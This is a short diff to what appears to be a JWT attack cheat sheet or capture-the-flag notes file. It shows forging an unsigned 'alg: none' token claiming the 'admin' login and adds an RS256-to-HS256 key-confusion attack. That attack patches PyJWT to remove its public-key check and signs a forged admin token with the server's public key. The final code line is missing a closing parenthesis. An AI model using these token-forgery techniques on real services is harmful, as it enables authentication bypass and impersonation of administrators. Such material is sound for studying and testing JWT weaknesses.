@@ -32,3 +32,10 @@ import jwt
 encoded = jwt.encode({'login': 'admin',"iat":int(time.time())}, None, algorithm=None)
 print(encoded)
 ```
+
+## trying to break RS256 algorithms, by sending JWT with HS256 alg,  signed with
+## public key from server
+# it's just a basic string check ,we can bypass this by commenting out
+# the relevent lines in :*/lib/python3.6/site-packages/jwt/algorithms.py
+# grep or search for PUBLIC
+encoded = jwt.encode({'login':'admin'},open('public','rb').read(),algorithm='HS256'
